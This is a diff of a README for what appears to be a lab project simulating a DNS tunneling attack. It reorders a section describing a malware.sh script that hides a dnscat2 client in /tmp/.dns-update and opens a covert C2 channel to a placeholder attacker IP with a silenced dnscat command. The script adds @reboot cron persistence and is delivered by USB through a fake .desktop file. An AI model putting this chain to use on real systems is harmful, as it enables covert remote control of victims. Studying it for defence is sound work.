@@ -27,24 +27,7 @@ This project simulates a DNS Tunneling attack using:
   -Listener Port: 53 (standard DNS)
 
   -Behavior: Replies to DNS queries with the attacker's IP instead of resolving them, enabling the victim to unknowingly connect to the dnscat2 server.
-  
-- `/malware`: 🐛 Malware Creation and Deployment
-A custom Bash script (`malware.sh`) was developed to simulate real-world malware behavior using DNS tunneling for covert Command and Control (C2) communication.
-  
-   ![image](https://github.com/user-attachments/assets/bb7d4a97-c78d-40bf-bebf-fd17233af4a3)
-
- ### 🔒 Stealthy Deployment
-  -Copies the `dnscat2` client to a hidden path: `/tmp/.dns-update`
-  -Sets execution permissions for silent execution
- ### 🌐 C2 Initialization
-  -Establishes a DNS-based C2 channel to the attacker's server over **UDP port 53**
-  -Launches the client using:
-  ./dnscat --dns server=<KALI_IP>,port=53 --secret=mysecret >/dev/null 2>&1
- ### ♻️ Persistence
-   -Adds a cron job with @reboot to ensure the malware runs on every system startup
- ### 💾 Infection Method:
-   -Delivered via USB drive
-   
+     
 - `/dnscat2`: 🧠 dnscat2 C2 Server Setup
   To complete the DNS tunneling setup, the attacker's environment includes running both the **dnscat2 C2 server** and the **dnschef fake DNS server** in parallel.
  ### ⚙️ dnscat2 Installation & Setup
@@ -69,6 +52,23 @@ A custom Bash script (`malware.sh`) was developed to simulate real-world malware
    ![image](https://github.com/user-attachments/assets/b6bb6cac-e639-4358-b740-28270d4a04f6)
     
    (‼️ Important: Both the dnscat2 server and dnschef must run simultaneously)
+   
+- `/malware`: 🐛 Malware Creation and Deployment
+A custom Bash script (`malware.sh`) was developed to simulate real-world malware behavior using DNS tunneling for covert Command and Control (C2) communication.
+  
+   ![image](https://github.com/user-attachments/assets/bb7d4a97-c78d-40bf-bebf-fd17233af4a3)
+
+ ### 🔒 Stealthy Deployment
+  -Copies the `dnscat2` client to a hidden path: `/tmp/.dns-update`
+  -Sets execution permissions for silent execution
+ ### 🌐 C2 Initialization
+  -Establishes a DNS-based C2 channel to the attacker's server over **UDP port 53**
+  -Launches the client using:
+  ./dnscat --dns server=<KALI_IP>,port=53 --secret=mysecret >/dev/null 2>&1
+ ### ♻️ Persistence
+   -Adds a cron job with @reboot to ensure the malware runs on every system startup
+ ### 💾 Infection Method:
+   -Delivered via USB drive
    
 - `/Autorun`:💾 USB-Based Delivery via `.desktop` File
   A fake `.desktop` file is used to trick users into executing a malicious script (`malware.sh`) from a USB drive. This method simulates social engineering by mimicking a legitimate system update.
